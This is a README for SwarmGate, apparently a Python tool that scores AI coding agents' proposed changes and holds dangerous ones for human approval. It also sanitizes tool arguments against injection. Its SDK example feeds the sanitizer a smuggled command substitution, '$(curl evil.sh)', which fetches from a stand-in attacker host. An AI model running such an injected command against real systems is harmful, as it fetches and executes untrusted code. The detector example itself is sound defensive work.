# 🚦 SwarmGate

[![CI](https://github.com/mbgulden/swarmgate/actions/workflows/ci.yml/badge.svg)](https://github.com/mbgulden/swarmgate/actions)
[![PyPI version](https://img.shields.io/badge/pypi-v0.1.0-blue.svg)](https://pypi.org/project/swarmgate/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12%20%7C%203.13-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

> **Attention Governor & Escalation Hypervisor for Multi-Agent Swarms**  
> *Deterministically scores every agent-proposed mutation with an Escalation Index (E), auto-committing the safe, digesting the notable, and putting a hard human barrier in front of the dangerous.*

---

## 💡 Why SwarmGate?

Autonomous coding agents move fast — and their speed is the risk. A swarm can propose a docs typo and a destructive `rm -rf` in the same breath. Human operators can't review every mutation, and they shouldn't have to.

**SwarmGate** solves the attention problem: it computes a deterministic **Escalation Index (E)** for every proposed change and routes it into one of three attention tiers:

- 🟢 **Tier 1 — Auto-commit:** low-risk changes (docs, tests) execute without touching the operator.
- 🟡 **Tier 2 — Async digest:** notable changes auto-commit, then land in a JSONL digest for batched review.
- 🔴 **Tier 3 — Barrier:** high-blast-radius mutations are *suspended* until a human explicitly approves or rejects them.

It also sanitizes tool arguments for **parameter injection** (flag injection, path traversal, command substitution) and forces maximum risk on anything suspicious.

---

## 🏛️ How It Works

```
                    ┌──────────────────────────────────────────────┐
                    │               AI Coding Agent                │
                    │   (proposes a mutation: edit, migrate, ...)   │
                    └──────────────────────┬───────────────────────┘
                                           │
                                     1. Evaluate
                                           ▼
                    ┌──────────────────────────────────────────────┐
                    │            EscalationEvaluator               │
                    │  E = Structural Risk × [0.25 × Blast Radius  │
                    │      + 0.75 × (1.0 − 0.30 × Reversibility)]   │
                    │  + parameter-injection sanitization          │
                    └──────────────────────┬───────────────────────┘
                                           │
                                2. Classify & route
                                           ▼
         ┌──────────────────┬──────────────────────┬──────────────────┐
         ▼                  ▼                      ▼
   🟢 TIER 1            🟡 TIER 2               🔴 TIER 3
   E < 0.30             0.30 ≤ E < 0.70          E ≥ 0.70
   Auto-commit          Auto-commit +            swarmlock SUSPEND
   (no operator         async digest log         → human approve /
   action)              (batched review)         reject required
```

**Escalation Index (E)** combines three deterministic factors:

| Factor | What it measures | Source |
|---|---|---|
| **Structural Risk** (0.0–1.0) | How dangerous the *target path* is: `.env`/secrets → 1.00, `auth/` → 0.95, migrations → 0.90, `engine/`/`core/` → 0.75, API routes → 0.65, docs → 0.05, tests → 0.10 | `policy.py` (`GatePolicy.get_path_risk`) |
| **Blast Radius** (0.10–1.0) | Change *size*: lines/50 × 0.40 + files/5 × 0.30 + dependents/5 × 0.30 | `evaluator.py` |
| **Reversibility** (0.0–1.0) | How undoable it is: inferred from risk (≥0.85 → 0.10, ≤0.15 → 1.00, else 0.60) or set explicitly with `--rev` | `evaluator.py` |

Thresholds (0.30 / 0.70), rate limits, and quiet hours are configurable via `.swarmgate/policy.json` (`GatePolicy.load`).

---

## 📦 Installation

```bash
pip install swarmgate
```

*Pure Python standard library. Zero runtime dependencies.*

---

## 🚀 Quick Start

### 1. Evaluate a change and route it

```bash
# Score a file change; prints a terminal attention card
swarmgate evaluate src/auth/login.py --lines 40 --deps 3

# Machine-readable decision packet
swarmgate evaluate src/auth/login.py --lines 40 --deps 3 --json

# Link it to a SwarmProof verification receipt and a SwarmSaga transaction
swarmgate evaluate src/auth/login.py --proof proof_9f2a --tx-id tx_77 --rev 0.2
```

Exit code is `2` when the decision lands on the Tier 3 barrier (handy for scripting gates).

### 2. Review pending Tier 3 decisions

```bash
# Interactive terminal queue: [y] approve · [n] reject · [s] skip
swarmgate review

# Print the queue without prompting (CI / automation)
swarmgate review --non-interactive

# Resolve one decision directly
swarmgate approve dec_a1b2c3d4e5f60718
swarmgate reject  dec_a1b2c3d4e5f60718
```

### 3. Catch up on Tier 2 activity

```bash
# Everything auto-committed in the last 24 hours
swarmgate digest --since 24h

# Clear the digest log
swarmgate digest --clear
```

### 4. Approve from your phone

```bash
# Mobile-friendly HTTP cockpit (binds your Tailscale IP, default port 8999)
swarmgate serve --port 8999
```

The cockpit shows pending barriers with diffs and one-tap Approve / Reject buttons.

---

## 🐍 Python SDK

```python
from swarmgate import EscalationEvaluator, SwarmgateBridge, AttentionTier

# 1. Score the mutation
evaluator = EscalationEvaluator()
decision = evaluator.evaluate(
    resource="file:src/auth/login.py",
    lines_changed=40,
    files_touched=2,
    dependents_count=3,
    reversibility=0.2,          # 0.0 = irreversible, 1.0 = trivially undoable
    agent_id="agent-7",
    proof_id="proof_9f2a",      # SwarmProof receipt, if verified
)

print(f"E={decision.escalation_score} → {decision.tier.value}")

# 2. Route it through the bridge (auto-commit / digest / suspend)
result = SwarmgateBridge.process_decision(decision, new_content=patched_source)
print(result["status"])  # AUTO_COMMITTED | SUSPENDED_FOR_REVIEW

# 3. Later: resolve a suspended Tier 3 decision
SwarmgateBridge.resolve_decision(decision.decision_id, approved=True)
```

Tool arguments can be screened for injection before scoring:

```python
warnings = evaluator.sanitize_arguments({"cmd": "deploy --exec $(curl evil.sh)"})
# → ["Security Alert: Suspicious parameter injection detected in argument 'cmd': ..."]
```

Anything tripping the sanitizer is scored at maximum structural risk (1.0).

---

## 🧩 Components

| Module | Class | Role |
|---|---|---|
| `evaluator.py` | `EscalationEvaluator` | Computes E, classifies tiers, sanitizes tool arguments |
| `schemas.py` | `DecisionPacket`, `AttentionTier`, `DecisionStatus` | Serializable decision record (`to_dict` / `from_dict` / `to_json`) |
| `policy.py` | `GatePolicy` | Path-risk weights, tier thresholds, `.swarmgate/policy.json` loading |
| `distiller.py` | `DecisionDiffDistiller` | Compresses diffs into scannable terminal attention cards |
| `digest.py` | `AsyncDigestManager` | Append-only JSONL log of Tier 2 auto-commits (`~/.swarmgate/digest.jsonl`) |
| `bridge.py` | `SwarmgateBridge`, `PendingDecisionStore` | Tier routing, swarmlock IPC (fail-open), pending-decision queue (`~/.swarmgate/pending_decisions.json`) |
| `server.py` | `run_server` | Mobile HTTP review cockpit (port 8999) |
| `cli.py` | `main` | `swarmgate` console entry point |

Paths are overridable: `PendingDecisionStore.configure(path)`, `SWARMGATE_PENDING_FILE` and `SWARMGATE_SWARMLOCK_SOCK` environment variables.

---

## 🤖 CI / CD Integration (GitHub Actions)

Gate a deploy on the attention barrier — a Tier 3 decision exits `2`:

```yaml
- name: Install SwarmGate
  run: pip install swarmgate

- name: Attention Gate
  run: |
    swarmgate evaluate deploy/migration.sql --lines 120 --rev 0.1 --json
    # exit code 2 → migration needs a human; the job stops here
```

---

## 🗺️ Swarm Ecosystem

SwarmGate is Stage 3 of the **Swarm Suite Agent Hypervisor** stack:

- 🛡️ **swarmproof**: deterministic verification *before* a change is trusted → link its receipt with `--proof`.
- 🚦 **swarmgate**: attention governance — this package.
- 🔒 **swarmlock**: 2PL state-commitment leases — the bridge sends COMMIT / SUSPEND / REVERT over the swarmlock socket (fail-open when no daemon is running).
- 📦 **swarmsaga**: distributed transactions — pass `--tx-id`; the cockpit can trigger saga garbage collection.

The bridge is embeddable: the Prismatic engine hypervisor points it at its own socket and pending-file paths instead of the defaults.

---

## 📄 License
MIT © GrowthWebDev
